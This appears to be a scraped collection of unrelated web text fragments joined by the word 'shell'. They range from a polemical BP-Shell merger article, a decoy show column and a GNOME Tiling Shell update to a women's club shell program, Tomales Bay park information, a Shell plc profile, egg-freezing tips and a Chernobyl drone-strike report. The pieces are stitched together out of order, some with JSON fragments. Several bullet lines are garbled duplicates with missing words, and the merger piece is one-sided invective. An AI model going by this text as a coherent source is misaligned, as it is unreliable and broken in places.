A London-based BP-Shell Frankenstein merger would create an unstoppable fossil fuel juggernaut, supercharged by Wall Street cash, happily torching the climate for profits while pretending to \u201clead\u201d the energy transition.\n\nWho\u2019s to Blame?\n\nThere\u2019s plenty of finger-pointing to go around.\n\nBrexit \u2013 Love it or hate it, international investors now see the UK as a second-tier market , no longer the gateway to Europe.\n\n\u2013 Love it or hate it, , no longer the gateway to Europe. Pension Fund Regulations \u2013 UK pension funds are pumping money into government bonds instead of British businesses , leaving London-listed firms vulnerable to corporate raiders.\n\n\u2013 UK pension funds are , leaving London-listed firms vulnerable to corporate raiders. Wall Street\u2019s Profit Frenzy \u2013 US tech stocks are where the big money is , leaving British businesses struggling to compete for investment.\n\n\u2013 , leaving British businesses struggling to compete for investment. Shell\u2019s Greedy Execs and Their Enablers \u2013 Shell\u2019s leadership is drooling over the thought of a New York listing\u2014because nothing says \u201ccommitment to the UK\u201d like threatening to abandon it for Wall Street\u2019s deep pockets.\n\nAnd let\u2019s not forget Elliott Investment Management, the aggressive New York hedge fund pushing BP to ditch renewables, sell off its green assets, and double down on old-school oil drilling. If BP merges with Shell, expect any remaining climate commitments to go straight into the bin.\n\nHow This Ends: Shell in New York, London in the Dust\n\nIf BP and Shell merge, expect the worst:\n\nMore Fossil Fuel Expansion \u2013 BP\u2019s half-hearted green promises will be erased in favor of drill, drill, drill .\n\n\u2013 BP\u2019s will be erased in favor of . London\u2019s Financial Sector Gets Another Blow \u2013 If Shell takes its primary listing to Wall Street , the UK\u2019s stock market will continue its downward spiral.\n\n\u2013 If Shell takes its , the UK\u2019s stock market will continue its downward spiral. Investors Get Rich, the Planet Burns \u2013 BlackRock and Vanguard, Shell\u2019s biggest backers, will cash in while emissions rise and extreme weather disasters multiply.\n\nLondon\u2019s reputation as a financial powerhouse is crumbling, and with government dithering and corporate greed running wild, it\u2019s only a matter of time before another British giant follows Shell to Wall Street.\n\nSo, will Labour step in to stop the exodus?

            "content": "CHILLICOTHE, Ill--Wondering why anyone would collect shotgun shell boxes, I stopped by Rich Lowe\u2019s artful table Sunday at the Henry Decoy Show.\n\nTalking with his wife Darby, I found myself doing what I always do talking with a collector: burrowing deep into history.\n\nI love the Henry Decoy Show, a mix of decoys, carvings, outdoors art, collectibles, books and outdoors-related sporting items. The 57th edition brought more rabbit holes, this year from the Chicagoland International Cartridge Show to duck hunting on southern Lake Michigan to a Mason Decoy mystery to the whys of collecting.\n\nDon and Almira Clark organized the Henry Decoy Show in 1968. By 1996, it grew enough to move to the Henry-Senachwine High School. The last three years, it has been at Three Sisters Park.\n\nDarby explained the appeal of shotgun shell boxes, especially the Peters boxes her husband preferred, noting, \u201cPeople like them because of the graphics. People like anything that an animal on it. Peters always went with good graphics.\u201d\n\nThe small box for Peters .410 shotgun shells is the most valuable piece in Rich Lowe\u2019s collection, shown here at the Henry Decoy Show in Chillicothe. Dale Bowman\n\nRich, a retired Air Force pilot, started collecting shot boxes in 1985. He focuses on pre-1940.\n\n\u201cI kind of had an itch,\u201d he said. \u201cMy father collected single shells. I started buying things and started doing this. At first I thought I was the only one doing this.\u201d\n\nThen he found out about John Schooler (I could not confirm the spelling) near Kansas City, Missouri, who also collected shotgun shell boxes. He sent Lowe a box with 50 boxes inside and Lowe selected the ones he wanted to bolster his collection, now estimated at 250 boxes.\n\nCollecting boxes for shotgun shells is the ultimate niche hobby. The one book on the topic, \u201cThe Encyclopedia of Shotgun Shell Boxes,\u201d by Ted and David Bacyk, came out in 2000.\n\nTalking to the Lowes led to the annual Chicagoland International Cartridge Show, held for years at the Drake Oak Brook. It was apparently quite the scene when the collectors in blue jeans came to the tony Drake.\n\nChange came in the late 1990s. Show history on cartridgeshow.com describes it this way, \u201cThe state of Illinois employee retirement fund was the new owner of the hotel, and the fund had no interest in anything having to do with guns or ammunition. During the 1999 post-show review, the Drake Oak Brook staff suggested that perhaps the show might be more comfortable at a new location.\u201d\n\nThe show moved to St. Louis, where it remains. The next St. Louis International Cartridge Show is April 16-19.\n\n* * *\n\nRacked waterfowl decoys and shore birds at the Henry Decoy Show in Chillicothe. Dale Bowman\n\nI had a mission this year, other than my usual wandering.\n\nRon Wozny, the great collector of Chicago fishing memorabilia, messaged, \u201cIf you know anyone at the show that might know the carver of this, could you show them a picture? It was left to me by a old friend that said it was worth some cash.\u201d\n\nWhen I asked Chicago collector Mike Anway if he could identify the decoy, he demurred on being an expert, but immediately said it was a Mason Decoy black duck. He said the head had been worked on, even so he valued it around $300 to $400.\n\nTo the uninitiated, this photo of a duck decoy Ron Wozny has owned for years looks nondescript, but, to experienced eyes at the Henry Decoy Show, it is a Mason black duck, probably worth several hundred dollars. Dale Bowman\n\nWozny\u2019s question gave me reason to chat with Patrick Gregory, whom I did a column on last February about his family, carving and baseball history. Gregory, too, knew immediately it was a Mason Decoy with head work done.\n\nGuyette & Deeter, the prime auctions for decoys, art and sporting arms, in its history on Mason decoys noted, \u201cAn Irish immigrant who settled in Detroit, William J. Mason started making handmade decoys in the late 1880s. By 1896, Mason was working as a full time decoy maker in a shed behind his house.\u201d\n\nIt expanded into a major business of decoy making, including an assembly line operation. Mason\u2019s son Herbert, expanded the operation to where, \u201cThousands of the Standard Grade decoys were distributed to Sears and Roebuck and Von Lengercke & Antoine in Chicago, and Mason Decoys became a name product across North America.\u201d\n\n* * *\n\nAt his booth at the Henry Decoy Show in Chillicothe, Capt. Jason Baldwin explains his aim to start guiding for duck hunting on southern Lake Michigan. Dale Bowman\n\nI chatted with Capt. Jason Baldwin of Top Dog Charters out of Belmont Harbor, who owned the Henry Decoy Show for years, about his plan to guide for waterfowl hunting on southern Lake Michigan.\n\nThe idea has intrigued me for decades and Baldwin, a man of eclectic interests and knowledge (Native Americans, Bowie Knives, sporting art, etc.), is seriously pursuing it.\n\nHe tested a Bankes Boats 21 1/2-foot Goliath, a uniquely designed duck boat with decoy shelves and built-in flotation, in the fall out of Indiana with success for sea ducks. For more, email him at topdogadventures@gmail.com.\n\nDecoys have working purposes as much as artistic ones.",

Edge Tiling (as no doubt you well know) is triggered by dragging a window to the sides of the screen.\n\nTo ensure Tiling Shell\u2019s edge snapping works properly in Ubuntu, turn \u2018Enhanced Tiling\u2019 off in Settings > Ubuntu Desktop\n\nUbuntu\u2019s \u201cEnhanced Tiling\u201d feature shows a Tiling Popup when window snapping to make it faster to tile other open apps to the remaining tile spaces without needing to manually drag them to screen edges.\n\nWindow Suggestions is the same idea, but arguably more useful: it shows window thumbnails, not app icons, so if you\u2019ve got several windows from the same app open (like the file manager) you can see which is which.\n\nAlso, if a lot of windows are open and thus available to tile, the suggestions list can be scrolled to allow you to find the one you want. A single click is all it takes to snap the window in-place.\n\nAs Window Suggestions for Edge Tiling is not enabled in Tiling Shell by default you\u2019ll need to head to the extension\u2019s Preferences panel to toggle it on (which is where you can also enable/disable window suggestions for the key-drag tiling system method).\n\nWindow Suggestions are now available for screen edge snapping\n\nElsewhere, the extension now makes use of GNOME\u2019s newer Nautilus-based file picker where supported (GNOME 47+), falling back to the regular GTK file chooser where it isn\u2019t, and adds UI/preferences/label text translations for Spanish and Simplified Chinese.\n\nIt also fixes a couple of bugs, including a flaw that meant maximised windows couldn\u2019t be (re)tiled left or right with keyboard shortcuts, regardless of gaps setting, and ensures the extension remembers chosen layout when creating/moving to a new workspace.\n\nFinally, this version of Tiling Shell adds support for GNOME 48 \u2013 nice and early, ahead of next month\u2019s GNOME 48 release. This is GNOME version Ubuntu 25.04 will use when released in April.\n\nAnother terrific update to this feature-packed window tiling tool\u2014more powerful, configurable, and featured window tiling tool than Ubuntu\u2019s own as it supports custom layouts, mouse-led and keyboard-driven window tiling, and more.\n\nAlready have Tiling Shell installed? You will get this update automatically, in the background (the update will only apply after you next log out and back in).\n\nIf you don\u2019t have Tiling Shell installed but you want to try it out, you can get the latest release (supports GNOME 42 and above) from the GNOME Extensions website:\n\n\u2022 Get Tiling Shell on GNOME Extensions",

MIWC President Maureen Chodaba welcomed members and guests to the Naples Lakes Country Club.\n\nKeeping with a long standing MIWC patriotic tradition, member Shirley Thayer led the audience in the Pledge of Allegiance and God Bless America. Cindy Wheeler delivered an invocation fused with the parable of the Starfish Story, reminding us that one person can make a difference in the lives of others.\n\nThe Marco Island Shell Club delighted the MIWC audience with a program about the shells of Marco Island. The Shell Club promotes the study, conservation, history and science of mollusks and seashells to encourage shell related interests such as collection and shell art. They raise funds to support scholarships, grants, and educational programs. They have endowed scholarships at FGCU, scholarship opportunities for graduating high school students, educational programs for grade school students, and seminars for adults in the community.\n\nShell Club member Cindy Wesolowski presented a variety of shells from the Horse Conch, Olive Shell, Lightning Whelk, Shark Eyes, Banded Tulip, and Alphabet Cone to the coveted Junonia, the crown jewel of all shells. We learned that the Sand Dollar is extremely fragile and when you open it up it has five teeth (doves)!\n\nShell Club member Cindy Konney taught us how to be successful shellers. She displayed her gear for successful shelling \u2013 a mesh bag, appropriate shoes, sunscreen, a small shovel, a hat, and water for hydration! And while you are out there, don\u2019t forget to stretch to avoid back pain! Train your eyes and walk slowly to find shells. Low tides and full moon shelling allow the best opportunities to find shells.\n\nMIWC President Maureen Chodaba proudly presented a donation to the Marco Island Shell Club to further their mission. You can support the Marco Island Shell Club by attending their upcoming Shell Art Sale March 14 and 15 at the New Life Community Church, Marco Island.

She and her husband have been long-time supporters of Meals of Hope and many other organizations in our community.\n\nRita Coyne introduced new member, Paula Keller. We welcome Paula to our mission of making a positive difference in our community.\n\nWe congratulate MIWC member Susie Walsh who was recently recognized by the Marco Island Area Chamber of Commerce as the 2024 Marco Island Volunteer of the Year!\n\nMIWC is preparing for the annual Fashion Show fundraiser. Mardi Gras Masquerade will be held February 17, Presidents Day, at Naples Lakes Country Club. All funds raised will be given back to our community through scholarships and other charitable causes through the Marco Island Woman\u2019s Club Charitable Foundation.\n\nMark your calendar now for a shopping event at J.McLaughlin, 1017 N.

The goals of this effort are to preserve and steward the park\u2019s Bishop pine and mixed hardwood forests, improve resilience of the forested and other habitat areas of the park for ecological benefit and to reduce wildfire risk, and to reestablish tribal priorities for vegetation management in the park. A virtual community meeting about this project was held on December 14, 2022. A recording of the meeting can be viewed here: Tomales Bay State Park Forest Health and Wildfire Resilience Project \u2013 Virtual Community Meeting - YouTube\n\n\n\nProject documents (draft project description, draft treatment prescriptions, and forest inventory) are currently available by request. To request project documents, please e-mail Bree Hardcastle at Bree.Hardcastle@parks.ca.gov or Cyndy Shafer at Cyndy.Shafer@parks.ca.gov.

Tomales Bay State Park is composed of 3 distinct use areas:\n\nHeart's Desire - Located at 1100 Pierce Point Road, in Inverness, Heart's Desire is the heart of Tomales Bay State Park. Here you will find the parks Ranger Station, Heart's Desire Beach, Vista Point Picnic Area, and hiking trails to Indian Beach, Pebble Beach, and Shell Beach. Dogs are not permitted on any beaches or trails in this area.\n\nLocated at 1100 Pierce Point Road, in Inverness, Heart's Desire is the heart of Tomales Bay State Park. Here you will find the parks Ranger Station, Heart's Desire Beach, Vista Point Picnic Area, and hiking trails to Indian Beach, Pebble Beach, and Shell Beach. Dogs are not permitted on any beaches or trails in this area. Shell Beach - Located at the end of Camino Del Mar in Inverness, Shell Beach offers two small beaches with access to the Johnstone trail which connects to Heart's Desire. The beaches are only accessible by hiking trail from the parking lot and spaces in the lot are very limited. Dogs are not permitted on any beaches or trails in this area.\n\nLocated at the end of Camino Del Mar in Inverness, Shell Beach offers two small beaches with access to the Johnstone trail which connects to Heart's Desire. The beaches are only accessible by hiking trail from the parking lot and spaces in the lot are very limited. Dogs are not permitted on any beaches or trails in this area. Millerton Point Located at 15475 HWY 1, north of Point Reyes Station, Millerton Point sits on the inland side of the bay and features Alan Sieroty Beach along with a loop trail. Dogs are not permitted on the beach, but are allowed on the loop trail while on leash.\n\nTomales Bay State Park is popular! The park is experiencing extremely high visitation and our lots often fills up by mid-morning on weekends. We recommend carpooling while visiting, or visiting the park on weekdays, or on weekends, early or late in the day to minimize wait times. Have an alternate plan and destination in mind if parking is full at your time of arrival. When our Heart\u2019s Desire lot is full, vehicles are slowly metered as other vehicles depart.\n\nIn addition to hiking, the park is a popular place for picnicking, swimming, clamming and boating. Overnight parking and camping are prohibited. The Vista Point Group Picnic Area is the only reservable space within the park. With beautiful views overlooking the bay, this is a lovely spot for a wedding, filming, or large gatherings. More reservation information is provided on the right (please scroll down).\n\n\n\nThe park includes forests, beaches, field, hills, meadows and marshes - each with its own plant life, including varieties of trees, shrubs and wildflowers. Note that all plants and wildlife within the park are protected. Collecting or destroying anything in the park, including mushrooms, is prohibited. Contact the nearby Bear Valley Visitor Center at (415)464-5100 for information on mushroom collecting in the Point Reyes National Seashore.\n\n\n\nOne of the finest remaining virgin groves of Bishop pine in California is in the park's Jepson Memorial Grove, reached by way of a one mile long trail.\n\n\n\nWildlife in the area includes foxes, raccoons, badgers, weasels, chipmunks, squirrels, rabbits, deer, bobcats, skunks, wood rats, field mice, moles and other animals.\n\n\n\nThere are also land and sea birds, including the spotted owl, quail, goldfinches, puffins, great blue heron, pelicans, ruddy ducks, woodpeckers, meadowlarks - and more.\n\n\n\nGopher snakes, garter snakes, lizards, and monarch butterflies make the park their home. In the beach areas, several variety of clams live, as do many other kinds of fish.\n\n\n\nPlanning Your Trip\n\nParking Fees: There is an $8 per vehicle entrance fee ($7 for anyone 62 or over) required for parking at Heart\u2019s Desire Beach and Vista Point. Fees are payable by credit or debit card only. Please be aware that citations may be issued for nonpayment of parking fees.\n\n\n\nGroup Outings: Heart\u2019s Desire Beach is very popular during summer weekends, especially on holiday weekends, and parking is limited. Groups meeting at Heart\u2019s Desire Beach on a weekend/holiday should consider carpooling to the extent possible. If the group cannot carpool then plan arriving at or near the same time. Since cell phone coverage in this area is very limited, it may be difficult for members of the group to comunicate with one another if they are separated.\n\n\n\nOnce the parking lots have filled, the park is closed and no additional cars will be permitted - even to drop off people or load /unload equipment. Please be aware that on a busy weekend the parking lots can fill as early as 11:00 A.M.! Alternate parking at the Jepson Trailhead, on Pierce Point Road, is 1.5 miles from Heart\u2019s Desire Beach.\n\n\n\nDogs: Dogs are not allowed on any of the beaches or trails at Tomales Bay State Park. Dogs are allowed only at the Vista Point picnic area and must be on leash at all times. If planning a group outing please make sure every member of the group knows about the park's dog policy. Leaving a dog in a vehicle is highly discouraged and may be illegal depending on conditions. If visitors plan to spend most of their time on the beaches or trails, they should consider leaving their dog at home.\n\n\n\nClimate/Recommended Clothing: Weather can change quickly. Visitors should be prepared by dressing in layers.\n\n\n\nPark History\n\nThe Coast Miwok people were the first to inhabit the coastal area of sheltered coves, beaches, tidal marshes, and forest of Bishop pines now known as Tomales Bay State Park, forty miles north of the Golden Gate Bridge.\n\n\n\nSir Francis Drake was the first explorer to land in this area in 1579, followed by the Spanish in 1595. Russian and German scientists explored the area in the early 1800s.\n\n\n\nIn the 1940s real estate developers began to purchase large areas of beachfront land, prompting local residents and conservation groups to save this area as a park. In 1952, Tomales Bay State Park was formally dedicated and opened to the public.\n\n\n\nNearby Attractions\n\nThe community of Inverness and the Point Reyes National Seashore are near the park. Past Tomales Bay State Park you will find beaches and historic ranches that compose the Point Reyes Seashore National Park. At the end of Pierce Point Road is the Tule Elk Preserve. Camping facilities are located 20-25 minutes from the park in the town of Olema, and at Samuel P. Taylor State Park in Lagunitas.",

            "content": "BP + Shell: The Unholy Merger That Could Create the Ultimate Greed Machine: Because One Corporate Villain Just Isn\u2019t Enough!\n\nWhat\u2019s worse than one greedy, polluting oil giant hellbent on squeezing every last drop of profit from a burning planet? Two of them merging into a mega-monster that could go toe-to-toe with the world\u2019s worst climate wreckers. That\u2019s right, bankers are reportedly scheming to merge BP and Shell, creating a single British oil behemoth so powerful it could bulldoze past competition and continue its relentless extraction with even less oversight.\n\nWhy Merge? Profits Over Planet, Obviously\n\nTop investment bankers, ever eager to engineer disasters for their own financial gain, are eyeing a BP-Shell megamerger to create one national champion of corporate greed. The goal? Compete with other environmental supervillains like ExxonMobil, Chevron, and TotalEnergies\u2014because apparently, the world doesn\u2019t have enough giant oil companies ignoring climate destruction for shareholder returns.\n\nGraham Ashby, Schroders asset manager, put it bluntly: \u201cLook at the Saudis and the Americans, they have scale. It is the most important factor in the oil industry. Forget the war in Ukraine and OPEC. They are side issues.\u201d\n\nYes, forget about geopolitics, human suffering, and a collapsing climate\u2014because what really matters is making sure BP and Shell can get even richer with economies of scale. What a fantastic moral compass!\n\nBP: The Struggling Underachiever vs. Shell: The Overachieving Polluter\n\nBP, ever the less competent of Britain\u2019s climate criminals, is facing a profits slump and increasing investor discontent. Its chief executive, Murray Auchincloss, is now in \u201cthe last chance saloon\u201d, as shareholders grow impatient with BP\u2019s dismal stock performance (down 2% over the past year, with a market cap of \u00a374 billion).\n\nMeanwhile, Shell is thriving under CEO Wael Sawan, thanks to aggressive cost-cutting, debt slashing, and a relentless commitment to fossil fuel profits. Shell\u2019s share price is up 9% in the last year, giving it a \u00a3164 billion valuation, but even Sawan isn\u2019t satisfied. He\u2019s already threatened to move Shell\u2019s primary listing to the US if its valuation doesn\u2019t improve. Because nothing says \u201cloyalty to Britain\u201d like threatening to leave unless the profits are higher.\n\nBig Oil\u2019s Best Friend: Wall Street\u2019s Greediest Players\n\nEnter Elliott Investment Management, the notoriously ruthless hedge fund run by billionaire vulture capitalist Paul Singer. Elliott has quietly built up a 5% stake in BP, and it\u2019s not for fun. Their brilliant plan? Slash spending on renewables, dump BP\u2019s green assets, and go all-in on good old-fashioned planet-wrecking oil.\n\nTranslation: More fossil fuels, less responsibility, and a return to the golden age of corporate recklessness.\n\nOh, and just to add to the chaos, Elliott is reportedly pushing for BP chairman Helge Lund to quit\u2014because clearly, the problem isn\u2019t that BP is drilling too much, but that it isn\u2019t drilling fast enough.\n\nBankers Are Salivating Over This Merger\n\nShell\u2019s advisers at Citigroup and Rothschild are already \u201cdoing the sums\u201d on a potential deal, while BP\u2019s Morgan Stanley and Robey Warshaw are in their own backroom discussions.\n\nThe potential megacorp would have a combined workforce of 180,000 employees and massive operations spanning the Gulf of Mexico, Iraq, and beyond. Imagine the environmental destruction potential of a company that size! BP\u2019s incompetence combined with Shell\u2019s greed\u2014it\u2019s the corporate equivalent of Frankenstein\u2019s monster, but with oil spills instead of bolts.\n\nThe Government? Probably Won\u2019t Stop It\n\nThe timing of this Frankenstein merger is interesting, to say the least. The UK\u2019s Competition and Markets Authority (CMA) has just been handed to a new chair, former Amazon boss Doug Gurr, after the Labour Party signaled it may weaken the CMA\u2019s regulatory powers. Translation? The government might be more than happy to let this disaster unfold in the name of \u201ceconomic growth.\u201d\n\nWhat\u2019s on the Chopping Block? Anything That\u2019s Not Pure Fossil Fuel Profits\n\nAs if BP wasn\u2019t already shedding any pretense of caring about the future, the company is looking to offload multiple divisions, including:\n\nIts US shale oil and gas business (because why keep assets when you can sell them off for a quick cash injection?).\n\n(because why keep assets when you can sell them off for a quick cash injection?). Castrol, its lubricants business (bought for \u00a34 billion in 2000, but who cares about history?).\n\n(bought for \u00a34 billion in 2000, but who cares about history?). Its petrol forecourt business (because selling off real-world infrastructure in favor of speculative fossil fuel bets is apparently the new strategy).\n\nBlackRock and Vanguard: The Silent Kingmakers\n\nOf course, no mega-merger would be complete without the silent blessing of Big Oil\u2019s biggest backers: BlackRock and Vanguard. These Wall Street giants control massive stakes in both BP and Shell, and they\u2019ll be more than happy to see a merger that guarantees even greater shareholder returns\u2014even if it means supercharging the climate crisis.\n\nWhile these firms love to parade their \u201cESG\u201d credentials in public, behind closed doors, they are fueling the exact kind of environmental destruction they claim to oppose. Because let\u2019s be real\u2014if a BP-Shell merger promises bigger dividends, they\u2019ll rubber-stamp it faster than you can say \u201cmelting ice caps.\u201d\n\nThe Bottom Line? This Merger Would Be a Climate Nightmare\n\nMerging BP and Shell isn\u2019t about competition, efficiency, or \u201cnational champions\u201d\u2014it\u2019s about consolidating power, slashing climate commitments, and making sure fossil fuel executives and their shareholders stay rich while the world burns.\n\nIf this deal goes through, expect:\n\nLess investment in renewables (BP\u2019s being forced to abandon them already).\n\nMore aggressive fossil fuel extraction (because that\u2019s what investors want).\n\nMore pollution, more spills, and more corporate greed, unchecked.\n\nSo while the bankers, hedge fund vultures, and oil executives pop champagne over their latest cash grab, the rest of us are left asking the same question: How much more destruction will it take before the world finally holds Big Oil accountable?\n\nShare this: Facebook\n\nTwitter\n\nEmail\n\nPrint\n\n\n\nLike this: Like Loading...\n\nThis website and sisters royaldutchshellgroup.com johndonovan.website , and shellnews.net , are owned by John Donovan .

            "content": "Shell plc, formerly known as Royal Dutch Shell plc, is a UK-based multinational oil and gas company. It is a vertically integrated and diversified company operating in all aspects of the oil industry. It is counted among the \u201csuper-majors\u201d and one of the world\u2019s largest companies in terms of scope, revenue and earnings. It is listed on the London LSE, the Amsterdam Euronext and the New York Stock Exchange.\n\nRoyal Dutch Shell plc was founded in 1907 because of Standard Oil\u2019s growth and growing global dominance. It is a merger of the Royal Dutch Petroleum Company (founded in 1890) and The \u201cShell\u201d Transport Compay, founded in 1897. The Royal Dutch Petroleum Company was engaged in oil operations in southeast Asia while The \u201cShell\u201d Transport Company was a family-owned import business focused initially on seashells.\n\nThe two operating segments of Royal Dutch Shell were not legally unified as a business for several reasons but acted as one company in all operations. The Royal Dutch Petroleum end of operations was responsible for the exploration and production of oil liquids and gasses while The \u201cShell\u201d Transport Company was responsible for transport and storage.\n\nThe company purchased assets from the Rothschilds in 1912 boosted operations by more than double. This led to explosive growth but the WWI years were hard on the company. More than 15% of its global operations were destroyed and had to be rebuilt or replaced, an issue it will have to deal with more than once as it expands around the globe. By 1930, Royal Dutch Shell was the world's largest producer of petroleum products and chemicals, a standing it will maintain for many years.\n\nThe company was known as one of the 7 Sisters which dominated the oil market between 1940 to 1970 and in 1970 it helped to pioneer oceanic transport of liquified natural gas. It maintained its dual status with operations, headquarters and listing in both London and the Netherlands until 2005. In 2005 it unified and became a single entity with its headquarters in The Hague, the Netherlands. That status lasted until 2022 when it unified once again, this time its Class A and Class B shares, and moved its headquarters to London.\n\nToday Shell plc operates as a diversified energy company with global operations. It operates through 4 key segments that are Integrated Gas, Upstream, Oil Products and Chemicals. The Gas and Upstream segments explore for and extract petroleum products while the Oil Products and Chemicals segments refine, store, transport and markets feedstocks, fuel products and petrochemicals. At the end of 2021, the company had just over 9 billion in proven reserves, a figure that had been in decline for 6 years.",

The shell was built in 2016 over another heavy concrete containment structure, which was placed on the plant\u2019s fourth reactor soon after the 1986 disaster.

In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other most promising energy stocks according to analysts.\n\nWith the world pivoting towards cleaner energy sources and facing political uncertainties, 2025 can be a critical year for the broader energy sector. As per GlobalData\u2019s Power Predictions 2025 report, numerous themes are expected to shape the global power landscape in 2025. These include geopolitical shifts influencing supply chains, developments in EVs, energy storage, hydrogen, and nuclear power. As per the Short-Term Energy Outlook released by the US Energy Information Administration, the generation in the US electric power sector is expected to increase by 2% in 2025 and by 1% in 2026, after rising 3% last year, driven by growth in renewable energy sources.\n\nWhat Lies Ahead for the US Energy Sector?\n\nAs per AXA Investment Managers, the combination of increased demand and supply constraints resulted in a favourable backdrop for the broader US renewable energy sector. Furthermore, the lower cost and environmental benefits of renewable energy are some positive factors. Trump\u2019s return to the White House kicked off with several executive orders. Apart from announcing a national energy emergency, he ordered the withdrawal from the Paris Agreement on climate change and rolled back the clean energy initiatives.\n\nDespite such announcements, AXA Investment Managers expects the US clean energy sector to have potential investment opportunities, considering the increasing power demand. The US power demand growth remained weak between 2000 and 2020, averaging 1%. However, it is projected to increase from 2024 onwards. As per the investment management firm, a 2% \u2013 3% increase in the growth rate per annum will be significant, reflecting a doubling or tripling of the historical rate. The overall US power demand can grow at a CAGR of 3.1% between 2020 and 2040, against 0.1% between 2010 and 2020. This higher demand will be supportive of the long-term trend, with potential investment opportunities, from power companies to the ones involved in the energy and equipment supply chain.\n\nREAD ALSO: 7 Best Stocks to Buy For Long-Term and 8 Cheap Jim Cramer Stocks to Invest In.\n\nTrump\u2019s Deregulation To Be a Critical Growth Factor\n\nOne of the President\u2019s priorities revolves around reducing government bureaucracy and inefficiency. Notably, permitting new energy projects remained slow over the past few years because of understaffed government departments and burdensome environmental criteria, opines AXA Investment Managers. In an executive order on \u201cunleashing American energy\u201d, Donald Trump is focusing on reducing official rules and processes that seem unnecessary, and accelerating energy projects, constraining the remit of the NEPA (National Environmental Policy Act). Interestingly, most of the permit requirements stem from this act.",

According to the Food and Drug Administration, to achieve the best quality, eggs should be stored promptly in a clean refrigerator at 40\u00b0F or below and used within three weeks of purchase. Learn more about egg safety at the shortened link, shorturl.at/V8BVC.\n\nElisa Maloberti, food safety manager at the American Egg Board, shared some tips about freezing extra eggs.\n\nCan you freeze eggs?\n\nYes! If you have more eggs than you can use within a few weeks, you can freeze them \u2212 but not in their shells. Eggs expand when frozen, which can cause shells to crack and introduce bacteria. Instead, break them out of their shells and store them properly.\n\nHow to freeze eggs:\n\nYolks: Egg yolks tend to gel when frozen, making them difficult to use later. To prevent this, beat in \u215b teaspoon salt per quarter-cup of yolks (for savory dishes); 1\u00bd teaspoons sugar or corn syrup per quarter-cup of yolks (for baking). Storage tip: Label containers with the number of yolks, date, and whether salt or sweetener was added.\n\nEgg whites: Separate eggs carefully so no yolk gets into the white. Two freezing methods: Pour whites into freezer containers and label with the number of whites; or freeze each white in an ice cube tray for easy measuring and quick thawing.\n\nWhole eggs: Lightly beat eggs before freezing to prevent textural changes. Store in an airtight container, label with the number of eggs and date, and freeze.\n\nEgg storage and usage tips:\n\nFrozen eggs last up to one year in a home freezer.\n\nThaw overnight in the fridge or under cold running water.\n\nUse thawed yolks and whole eggs immediately.\n\nThawed egg whites whip better if left at room temperature for 30 minutes.\n\nAlways use thawed eggs in fully cooked dishes.\n\nEgg substitutes: Cooking without eggs\n\nEggs provide structure, moisture and binding in recipes, but when you\u2019re out or are avoiding them, finding the right substitute depends on what you\u2019re making.\n\n\u201cThe trick when substituting for eggs is knowing what you\u2019re making and picking the right swap to get the best texture and flavor,\u201d said Dennis Littley, chef and recipe expert at Ask Chef Dennis. \u201cFor neutral, all-purpose substitutes, store-bought egg replacers like Bob\u2019s Red Mill or Ener-G work well, especially for delicate baked goods.\u201d\n\nBut if you\u2019re looking for everyday kitchen swaps, here are some of the best alternatives:\n\nItalian dishes to go: Burrata Italian Kitchen takeout turns quiet night at home into a feast\n\nAquafaba is aqua-fabulous\n\nAt some point, you\u2019ve probably drained a can of chickpeas and thrown away one of the best vegan egg substitutes.\n\nAquafaba, the liquid from canned chickpeas, is a powerhouse in baking. But, it's important to note that this can be used only with the liquid from chickpeas, no other canned bean works.\n\n\u201cAquafaba rules,\" Ellen Kanner of Soulful Vegan said. \"Unlike flax seeds, it won\u2019t get gummy, and unlike commercial vegan egg substitutes, it contains no weird chemicals.\u201d\n\nHow to use aquafaba:\n\nFor binding : Use directly from the can for burgers, meatloaf and baking.\n\n: Use directly from the can for burgers, meatloaf and baking. For whipping : To create stiff peaks, whip with cream of tartar to stabilize (like egg whites). Kanner notes \u201cit takes about 10 minutes in a stand mixer to form stiff peaks, but delivers amazing meringues and mousses.\u201d\n\n: To create stiff peaks, whip with cream of tartar to stabilize (like egg whites).

AP\n\nThe Chernobyl plant is the site of the world\u2019s first level 7 nuclear energy accidents, when Reactor 4 suffered a power surge resulting in steam explosions and a meltdown on April 26, 1986.\n\nSecurity camera footage shared by Zelensky captured the moment a bright flash lit up the dark sky at the defunct power plant before a large fireball rose from the domed roof of the confinement structure.\n\nAerial footage captured flames shooting from the hole before additional video showed what appeared to be the burned remains of the drone inside.\n\nZelensky claimed the attack caused significant damage to the structure and ignited a fire.\n\n4 The strike happened early Friday morning. @ZelenskyyUa/X\n\nThe blaze has since been extinguished.\n\nRadiation levels have not risen since the attack and officials continue to monitor the readings.\n\nThe reported attack happened just after 2 a.m. 62 miles north of Kyiv.\n\nZelensky blasted Russia for the dangerous attack, saying the structure was built by many European countries \u201ccommitted to real security of the world.\u201d\n\n4 Zelensky said that the drone strike damaged the structure and started a fire. @ZelenskyyUa/X\n\n\u201cThe only country in the world that attacks such sites, occupies nuclear power plants, and wages war without any regard for the consequences is today\u2019s Russia,\u201d he said.\n\nZelensky claimed Russian President Vladimir Putin isn\u2019t ready to sit down with Ukraine and the United States to discuss ending the war that started nearly three years ago on Feb. 24, 2022.\n\nThe 47-year-old president called out Putin for his \u201canti-human rhetoric\u201d and the daily attacks on his country that have damaged major cities\u2019 infrastructure and killed thousands since the war started.\n\n4 Officials say radiation levels have not increased since the strike. @ZelenskyyUa/X\n\n\u201cThis means that Putin is definitely not preparing for negotiations \u2014 he is preparing to continue deceiving the world. That is why there must be unified pressure from all who value life \u2013 pressure on the aggressor. Russia must be held accountable for its actions,\u201d he said.\n\nThe power plant has been a target throughout the war, with Russian Troops capturing control of the Chernobyl Exclusion area on the first day of the attacks.\n\nPutin later threatened Ukraine with a \u201cnew Chernobyl\u201d occupied Zaporizhzhia nuclear power plant.\n\nFollowing the deadly Chernobyl Power Plant meltdown in 1986, a structure, aptly named the sarcophagus was erected around the reactor as construction took place over 206 days.\n\nBecause of the high levels of radiation from the reactor, workers couldn\u2019t fully seal off the destroyed building from the outside world.\n\nThe design, first created 24 days after the incident, was given a life span of 20 to 30 years, leaving officials to need a better more permanent protective cover.\n\nIn November 2016, the current domed structure was rolled into place over the reactor and the sarcophagus.\n\nwith Post wires",

